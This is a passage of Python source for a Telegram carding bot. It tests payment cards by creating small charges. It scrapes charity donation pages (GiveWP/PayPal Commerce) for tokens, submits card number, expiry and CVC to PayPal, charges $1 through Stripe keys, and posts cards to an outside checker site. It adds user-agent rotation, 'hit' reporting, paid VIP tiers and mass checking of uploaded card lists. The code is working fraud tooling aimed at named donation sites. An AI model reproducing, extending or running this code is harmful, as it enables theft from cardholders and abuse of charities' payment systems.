            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
        ]
        self.ua_index = 0
        self._init_and_extract()
        self._get_access_token()
        self._get_client_token()

    def get_next_ua(self):
        try:
            return self.uu.random
        except:
            ua = self.user_agents[self.ua_index % len(self.user_agents)]
            self.ua_index += 1
            return ua

    def get_address_data(self):
        return {
            'give-address1': '123 Main Street', 'give-address2': 'Apt 4B',
            'give_Address2': 'Apt 4B', 'give-address_2': 'Apt 4B',
            'give_address2': 'Apt 4B', 'give_address_2': 'Apt 4B',
            'address_2': 'Apt 4B', 'address2': 'Apt 4B',
            'give-city': 'New York City', 'give-state': 'NY',
            'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234',
            'address1': '123 Main Street', 'city': 'New York City',
            'state': 'NY', 'zip': '10001', 'country': 'US', 'phone': '2125551234',
            'billing_address_2': 'Apt 4B', 'shipping_address_2': 'Apt 4B',
        }

    def get_terms_data(self):
        return {
            'give_agree_to_terms': '1', 'give_tos_agree': '1',
            'give_terms_agreement': '1', 'give_terms': '1',
            'agree_to_terms': '1', 'tos_agree': '1',
        }

    def get_base_form_data(self):
        form_data = self.form_data.copy()
        first_name = random.choice(self.first_name)
        last_name = random.choice(self.last_name)
        form_data.update({
            'give-amount': self.minimum_amount, 'give-currency': self.currency,
            'currency': self.currency, 'payment-mode': 'paypal-commerce',
            'give_first': first_name, 'give_last': last_name,
            'first_name': first_name, 'last_name': last_name,
            'give_email': self.email, 'email': self.email,
            'give-gateway': 'paypal-commerce', 'give_company': '',
            'give_comment': '', 'give_anonymous': '0',
        })
        form_data.update(self.get_address_data())
        form_data.update(self.get_terms_data())
        return form_data

    def _extract_minimum_amount(self, html):
        try:
            patterns = [
                r'minimum donation amount of \$([\d.]+)',
                r'minimum donation amount of &euro;([\d.]+)',
                r'minimum donation amount of €([\d.]+)',
                r'minimum donation amount of £([\d.]+)',
                r'minimum donation amount[^\d]*([\d.]+)',
                r'data-min-amount=["\']([\d.]+)["\']',
                r'data-minimum-amount=["\']([\d.]+)["\']',
                r'min-amount=["\']([\d.]+)["\']',
                r'minimum_amount=["\']([\d.]+)["\']',
                r'min_amount=["\']([\d.]+)["\']',
                r'This form has a minimum donation amount of \$([\d.]+)',
                r'This form has a minimum donation amount of &euro;([\d.]+)',
            ]
            for pattern in patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    amount = match.group(1)
                    try:
                        float(amount)
                        self.minimum_amount = amount
                        return
                    except:
                        continue
            min_inputs = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
            if min_inputs:
                valid_amounts = [x for x in min_inputs if x.replace('.', '').isdigit()]
                if valid_amounts:
                    self.minimum_amount = max(valid_amounts, key=float)
                    return
            self.minimum_amount = "1.00"
        except:
            self.minimum_amount = "1.00"

    def _is_not_paypal_page(self, html):
        if not html:
            return True
        indicators = ['paypal', 'client-id', 'client_id', 'admin-ajax', 'give-form', 'donation-form', 'give_paypal', 'paypal_commerce', 'givewp']
        return not any(ind in html.lower() for ind in indicators)

    def _init_and_extract(self):
        try:
            headers = {'user-agent': self.get_next_ua(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
            self.cookies = dict(response.cookies)
            html = response.text
            if self._is_not_paypal_page(html):
                self.is_valid_gateway = False
                return
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._extract_ajax_url(html)
            self._extract_minimum_amount(html)
        except:
            self.is_valid_gateway = False

    def _extract_client_id(self, html):
        patterns = [
            r'client-id="([^"]+)"', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'data-client-id="([^"]+)"', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for script in script_matches:
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return
        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
        for string in long_strings:
            if string.startswith(('A', 'B', 'E')):
                self.client_id = string
                return

    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
                self.form_data[attr_name] = attr_value

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'

    def _get_access_token(self):
        if not self.client_id:
            return None
        try:
            headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
            if response.status_code == 200:
                self.access_token = response.json().get('access_token')
                return self.access_token
        except:
            pass
        return None

    def _get_client_token(self):
        if not self.ajax_url:
            return None
        try:
            actions = ['give_paypal_commerce_get_client_token', 'get_client_token', 'paypal_get_client_token']
            for action in actions:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {'user-agent': self.get_next_ua(), 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=15)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict):
                                self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
                            elif isinstance(json_data['data'], str):
                                self.client_token = json_data['data']
                            if self.client_token:
                                return self.client_token
                    except:
                        pass
            return None
        except:
            return None

    def _create_order(self):
        if not self.is_valid_gateway:
            return None
        if self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        if self.client_token:
            order_id = self._create_order_with_client_token()
            if order_id:
                return order_id
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        amounts = []
        if self.minimum_amount != "1.00":
            amounts.append(self.minimum_amount)
        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
        for amount in amounts:
            form_data = self.get_base_form_data()
            form_data['give-amount'] = amount
            form_data['amount'] = amount
            for action in actions:
                params = {'action': action}
                try:
                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                    if response.status_code == 200 and response.text:
                        try:
                            json_data = response.json()
                            if 'data' in json_data:
                                if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                    return json_data['data']['id']
                                elif isinstance(json_data['data'], str):
                                    return json_data['data']
                            if 'id' in json_data:
                                return json_data['id']
                            if 'order_id' in json_data:
                                return json_data['order_id']
                            if 'orderID' in json_data:
                                return json_data['orderID']
                        except:
                            pass
                except:
                    continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _create_order_with_client_token(self):
        if not self.client_token:
            return None
        try:
            headers = {'authorization': f'Bearer {self.client_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}]}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _approve_order(self, order_id):
        if self.ajax_url and 'admin-ajax' in self.ajax_url:
            result = self._approve_order_givewp(order_id)
            if result:
                return result
        if self.access_token:
            try:
                headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua()}
                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=15)
                return response
            except:
                pass
        return None

    def _approve_order_givewp(self, order_id):
        if not self.ajax_url:
            return None
        amounts = []
        if self.minimum_amount != "1.00":
            amounts.append(self.minimum_amount)
        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        for amount in amounts:
            form_data = self.get_base_form_data()
            form_data['give-amount'] = amount
            form_data['amount'] = amount
            for action in actions:
                params = {'action': action, 'order': order_id}
                try:
                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                    if response.status_code == 200:
                        return response
                except:
                    continue
        return None

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_strip = text.strip()
        text_lower = text_strip.lower()
        if text_lower == 'true':
            return 'CHARGE 1.0'
        try:
            approve_json = json.loads(text_strip)
            if isinstance(approve_json, dict):
                if approve_json.get('success') is True:
                    data = approve_json.get('data', {})
                    if isinstance(data, dict):
                        order = data.get('order', {})
                        if isinstance(order, dict):
                            order_status = str(order.get('status', '')).upper()
                            payment_source = order.get('payment_source', {})
                            card = payment_source.get('card', {}) if isinstance(payment_source, dict) else {}
                            if order_status == 'COMPLETED' and card:
                                return 'CHARGE 1.0'
        except:
            pass
        if 'insufficient' in text_lower:
            return 'INSUFFICIENT_FUNDS'
        for pr in self.paypal_responses:
            if pr in text_strip.upper():
                if pr == 'ORDER_NOT_APPROVED':
                    return "Payer cannot pay for this transaction."
                return pr
        if len(text_strip) < 100:
            return "PAYER_ACTION_REQUIRED"
        return text_strip[:200]

    def Charge(self, ccx):
        try:
            if not self.is_valid_gateway:
                return "INVALID_GATEWAY"
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"
            order_id = self._create_order()
            if not order_id:
                return "Create Order Failed"
            auth_tokens = []
            if self.client_token:
                auth_tokens.append(self.client_token)
            if self.access_token:
                auth_tokens.append(self.access_token)
            if self.client_id:
                auth_tokens.append(self.client_id)
            confirm_res = None
            confirm_json = {}
            confirm_text = ""
            for auth_token in auth_tokens:
                he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.get_next_ua()}
                da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                try:
                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
                    confirm_text = confirm_res.text
                    if confirm_res.status_code == 200:
                        try:
                            confirm_json = confirm_res.json()
                        except:
                            confirm_json = {}
                        break
                except:
                    continue
            if isinstance(confirm_json, dict):
                if 'details' in confirm_json and len(confirm_json['details']) > 0:
                    detail = confirm_json['details'][0]
                    issue = detail.get('issue', '')
                    description = detail.get('description', '')
                    if issue:
                        if issue == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        if description:
                            return f"{issue}: {description}"
                        return issue
                if 'name' in confirm_json:
                    name = confirm_json.get('name', '')
                    if name in self.paypal_responses:
                        msg = confirm_json.get('message', '')
                        if msg:
                            return f"{name}: {msg}"
                        return name
                if 'message' in confirm_json:
                    return confirm_json.get('message', '')
            if confirm_text:
                try:
                    text_json = json.loads(confirm_text)
                    if isinstance(text_json, dict):
                        if 'details' in text_json and len(text_json['details']) > 0:
                            detail = text_json['details'][0]
                            issue = detail.get('issue', '')
                            description = detail.get('description', '')
                            if issue:
                                if issue == 'ORDER_NOT_APPROVED':
                                    return "Payer cannot pay for this transaction."
                                if description:
                                    return f"{issue}: {description}"
                                return issue
                        if 'name' in text_json:
                            name = text_json.get('name', '')
                            if name in self.paypal_responses:
                                msg = text_json.get('message', '')
                                if msg:
                                    return f"{name}: {msg}"
                                return name
                except:
                    pass
                issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
                if issue_matches:
                    issue = issue_matches[0]
                    if issue == 'ORDER_NOT_APPROVED':
                        return "Payer cannot pay for this transaction."
                    desc_matches = re.findall(r'"description"\s*:\s*"([^"]+)"', confirm_text)
                    if desc_matches:
                        return f"{issue}: {desc_matches[0]}"
                    return issue
                name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', confirm_text)
                if name_matches:
                    name = name_matches[0]
                    if name in self.paypal_responses:
                        msg_matches = re.findall(r'"message"\s*:\s*"([^"]+)"', confirm_text)
                        if msg_matches:
                            return f"{name}: {msg_matches[0]}"
                        return name
            approve_res = self._approve_order(order_id)
            text = approve_res.text if approve_res else ''
            if text:
                return self._clean_response(text)
            return "DECLINED"
        except Exception as e:
            return f"Error: {e}"

async def check_card_api(card_full, gateway_url):
    async with api_semaphore:
        try:
            loop = asyncio.get_event_loop()
            def run_check():
                pp_engine = PayPalCommerce(target_url=gateway_url if gateway_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/')
                return pp_engine.Charge(card_full)
            result_raw = await loop.run_in_executor(None, run_check)
            await asyncio.sleep(0.5)
            result = str(result_raw)
            result_lower = result.lower()
            if result.startswith("CHARGE"):
                return "approved", result_raw
            elif "insufficient" in result_lower:
                return "live", result_raw
            else:
                if result.startswith("Error:"):
                    result = result.replace("Error:", "").strip()
                if result and result != "DECLINED":
                    return "declined", result
                else:
                    return "declined", "Declined"
        except Exception as e:
            return "declined", f"Error: {e}"

def check_stripe_sync(card, key_id="1"):
    try:
        if not STRIPE_KEYS:
            return "No Stripe keys"
        key = STRIPE_KEYS.get(str(key_id))
        if not key:
            return f"Key {key_id} not found"
        pk = key.get("pk", "")
        sk = key.get("sk", "")
        if not pk or not sk:
            return f"Key {key_id}: Invalid keys"
        parts = card.strip().split("|")
        if len(parts) != 4:
            return "INVALID FORMAT"
        cc_number, exp_month, exp_year, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        if len(exp_year) == 2:
            exp_year = "20" + exp_year
        session = requests.Session()
        session.verify = False
        headers = {"Authorization": f"Bearer {pk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {"card[number]": cc_number, "card[exp_month]": exp_month, "card[exp_year]": exp_year, "card[cvc]": cvc}
        r = session.post("https://api.stripe.com/v1/tokens", headers=headers, data=data, timeout=30)
        if r.status_code != 200:
            error = r.json().get("error", {})
            error_msg = error.get("message", "Unknown")
            decline_code = error.get("decline_code", "")
            error_code = error.get("code", "")
            if decline_code:
                return f"Key {key_id} | {decline_code}: {error_msg}"
            elif error_code:
                return f"Key {key_id} | {error_code}: {error_msg}"
            else:
                return f"Key {key_id} | {error_msg[:50]}"
        token_id = r.json()["id"]
        headers = {"Authorization": f"Bearer {sk}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"}
        data = {"amount": "100", "currency": "usd", "source": token_id, "description": "WAFA"}
        r = session.post("https://api.stripe.com/v1/charges", headers=headers, data=data, timeout=30)
        if r.status_code == 200:
            status = r.json().get("status", "")
            if status == "succeeded":
                return f"Key {key_id} | CHARGE $1"
            elif status in ["pending", "processing"]:
                return f"Key {key_id} | LIVE"
            else:
                return f"Key {key_id} | {status}"
        else:
            error = r.json().get("error", {})
            error_msg = error.get("message", "Unknown")
            decline_code = error.get("decline_code", "")
            error_code = error.get("code", "")
            if decline_code:
                return f"Key {key_id} | {decline_code}: {error_msg}"
            elif error_code:
                return f"Key {key_id} | {error_code}: {error_msg}"
            else:
                return f"Key {key_id} | {error_msg[:50]}"
    except Exception as e:
        return f"Key {key_id} | Error: {str(e)[:50]}"
    finally:
        try:
            session.close()
        except:
            pass

def check_auth_sync(card):
    try:
        session = requests.Session()
        session.verify = False
        data = MultipartEncoder({'data': (None, card),})
        headers = {
            'authority': 'uncoder.eu.org', 'accept': '*/*',
            'accept-language': 'ar-CA,ar;q=0.9,en-CA;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': data.content_type, 'origin': 'https://uncoder.eu.org',
            'referer': 'https://uncoder.eu.org/cc-checker/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        }
        start_time = time.time()
        response = session.post('https://uncoder.eu.org/cc-checker/api.php', headers=headers, data=data)
        end_time = time.time()
        taken = round(end_time - start_time, 2)
        try:
            json_data = response.json()
            message = json_data.get('message', '')
            if 'approved' in message.lower():
                return {'status': 'approved', 'message': 'Approved — $0 auth', 'taken': taken}
            elif 'insufficient' in message.lower():
                return {'status': 'live', 'message': 'Insufficient Funds', 'taken': taken}
            else:
                return {'status': 'declined', 'message': message[:80], 'taken': taken}
        except:
            return {'status': 'error', 'message': 'Error parsing response', 'taken': taken}
    except Exception as e:
        return {'status': 'error', 'message': str(e)[:50], 'taken': 0}
    finally:
        try:
            session.close()
        except:
            pass

async def send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name):
    hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
- - - - - - - - - - - - - - - - - - - - - -
⚡ 𝐔𝐬𝐞𝐫: @{username}
⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
- - - - - - - - - - - - - - - - - - - - - -
🤖 checker v1"""
    try:
        await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
    except:
        pass

# ==================== Bot Handlers ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    username = update.effective_user.username or "No Username"
    keyboard = [
        [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
        [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
        [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
        [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
        [InlineKeyboardButton("🧹 Clean Cards", callback_data="clean_panel"), InlineKeyboardButton("📁 Split Parts", callback_data="parts_panel")],
    ]
    await update.message.reply_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    await query.edit_message_text(premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /st [card] - Stripe single\n• /ch [card] - Charge 1$ single\n• /auth [card] - Auth $0 check\n• /clean - Clean cards file\n• /parts [num] - Split file\n• /stop - Stop mass\n• /code [key] - Activate VIP"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    await query.edit_message_text(premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking (Max 2000)\n• /st [card] - Stripe single\n• /ch [card] - Charge 1$ single\n• /auth [card] - Auth $0 check"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ADMINS:
        await query.answer("Admin only!", show_alert=True)
        return
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    await query.edit_message_text(premium_emoji("👑 ADMIN COMMANDS:\n• /add [url] - Add gateway\n• /rmadd [num] - Remove gateway\n• /show_gateways - Show gateways\n• /ban_user [id] - Ban user\n• /unban_user [id] - Unban user\n• /prm [id] [days] - Add VIP\n• /rmprm [id] - Remove VIP\n• /addkey [pk] [sk] - Add Stripe key\n• /rmkey [id] - Remove Stripe key\n• /wafa [days] [max] - Generate codes\n• /SENT [msg] - Broadcast"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def check_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [
        [InlineKeyboardButton("💳 PayPal", callback_data="check_paypal")],
        [InlineKeyboardButton("💳 Stripe", callback_data="check_stripe")],
        [InlineKeyboardButton("💳 Charge 1$", callback_data="check_charge")],
        [InlineKeyboardButton("🛡 Auth $0", callback_data="check_auth")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")],
    ]
    await query.edit_message_text(premium_emoji("💳 Choose check type:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def check_paypal_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/pp [card]</code>"), parse_mode="HTML")

async def check_stripe_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/st [card]</code>"), parse_mode="HTML")

async def check_charge_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("💳 Send card:\n<code>/ch [card]</code>"), parse_mode="HTML")

async def check_auth_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("🛡 Send card:\n<code>/auth [card]</code>"), parse_mode="HTML")

async def clean_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("🧹 Send cards file to clean:\nFormat: <code>number|mm|yy|cvv</code>"), parse_mode="HTML")

async def parts_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(premium_emoji("📁 Send file then use:\n<code>/parts [number]</code>\n\nExample: <code>/parts 4</code>"), parse_mode="HTML")

async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    await query.edit_message_text(premium_emoji(f"📊 STATS:\n👥 Users: {len(ALL_USERS)}\n🌐 Gateways: {len(GATEWAYS)}\n🔑 Stripe Keys: {len(STRIPE_KEYS)}"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    username = query.from_user.username or "No Username"
    keyboard = [
        [InlineKeyboardButton("🤖 Free Commands", callback_data="free_cmds")],
        [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
        [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
        [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
        [InlineKeyboardButton("🧹 Clean Cards", callback_data="clean_panel"), InlineKeyboardButton("📁 Split Parts", callback_data="parts_panel")],
    ]
    await query.edit_message_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_gateways(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    if not GATEWAYS:
        await update.message.reply_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
        return
    keyboard = []
    for i, gateway in enumerate(GATEWAYS, 1):
        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
    await update.message.reply_text(premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def gate_info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ADMINS:
        return
    gate_num = int(query.data.split("_")[2])
    if 1 <= gate_num <= len(GATEWAYS):
        gateway_url = GATEWAYS[gate_num - 1]
        keyboard = [
            [InlineKeyboardButton("🗑 Remove", callback_data=f"gate_remove_{gate_num}")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_gateways")],
        ]
        await query.edit_message_text(premium_emoji(f"🌐 <b>Gateway #{gate_num}:</b>\n<code>{gateway_url}</code>\n\nChoose action:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def gate_remove_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id not in ADMINS:
        return
    gate_num = int(query.data.split("_")[2])
    if 1 <= gate_num <= len(GATEWAYS):
        GATEWAYS.pop(gate_num - 1)
        keyboard = []
        for i, gateway in enumerate(GATEWAYS, 1):
            keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
        keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
        await query.edit_message_text(premium_emoji(f"🗑 <b>Gateway #{gate_num} removed!</b>\n\n🌐 <b>Remaining ({len(GATEWAYS)}):</b>"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def back_to_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not GATEWAYS:
        await query.edit_message_text(premium_emoji("❌ No gateways."), parse_mode="HTML")
        return
    keyboard = []
    for i, gateway in enumerate(GATEWAYS, 1):
        keyboard.append([InlineKeyboardButton(f"🌐 Gate #{i}", callback_data=f"gate_info_{i}")])
    keyboard.append([InlineKeyboardButton("🔙 Close", callback_data="close_gateways")])
    await query.edit_message_text(premium_emoji(f"🌐 <b>Gateways ({len(GATEWAYS)}):</b>\n\nChoose a gateway to manage:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def close_gateways_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.delete_message()

async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands_text = """👑 ADMIN:
• /add [url] - Add PayPal gateway
• /rmadd [num] - Remove gateway
• /show_gateways - Show gateways
• /ban_user [id] - Ban user
• /unban_user [id] - Unban user
• /prm [id] [days] - Add VIP
• /rmprm [id] - Remove VIP
• /wafa [days] [max] - Generate keys
• /show_users - Show users
• /try [id] [msg] - DM user
• /SENT [msg] - Broadcast
• /addkey [pk] [sk] - Add Stripe key
